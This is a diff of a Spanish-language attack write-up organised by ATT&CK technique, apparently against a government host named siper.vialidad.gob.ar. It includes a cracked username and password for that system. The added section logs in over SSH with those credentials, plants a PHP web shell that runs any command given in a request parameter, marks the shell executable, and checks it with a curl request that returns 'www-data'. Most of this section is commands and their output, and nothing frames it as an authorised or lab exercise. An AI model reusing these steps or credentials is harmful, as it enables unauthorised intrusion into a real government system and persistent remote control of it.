@@ -654,15 +654,67 @@ resultado:
 [SUCCESS] Credentials encontradas: operador:Vialidad2024
 ```
 
-## Exploitation
-- T1190 – Exploit Public-Facing Application
- ```text
+## Exploitation & Installation
+- T1505.003 – Server Software Component: Web Shell
 
-
-
-
+```text
+    # Conexión SSH con credenciales comprometidas
+    ssh operador@siper.vialidad.gob.ar
+    # Contraseña: Vialidad2024
  ```
+ Despues de conectado instalo el web shell
+
+ ```text
+  # Creo directorio de uploads si no existe
+  mkdir -p /tmp/uploads
+
+  # Crear el archivo shell.php
+    echo '<?php
+    if(isset($_REQUEST["cmd"])) {
+        system($_REQUEST["cmd"] . " 2>&1");
+    }
+    ?>' > /tmp/uploads/shell.php
+   # Verificar que el archivo se creó correctamente
+   ls -la /tmp/uploads/shell.php
+  ```
+  respuesta:
+      ```text
+      -rw-r--r-- 1 operador operador 89 Sep 10 15:30 /tmp/uploads/shell.php
+      ```
   
+  asigno permiso:
+      ```text
+      chmod +x /tmp/uploads/shell.php
+      ```
+  - T1210 – Exploitation of Remote Services
+
+
+   verificación:
+
+  Desde el exterior, pruebo el web shell
+      ```text
+      curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
+      ```
+   respuesta:
+   Resultado exitoso: www-data
+
+
+   
+  Instalación de web shell para acceso persistente:
+ ```text
+    <?php
+    if(isset($_REQUEST['cmd'])) {
+        system($_REQUEST['cmd'] . " 2>&1");
+    }
+    ?>
+ ```
+
+- T1210 – Exploitation of Remote Services  
+ ```text
+ curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
+ ```
+
+
 
 ## Command & Control
 - T1071 – Application Layer Protocol
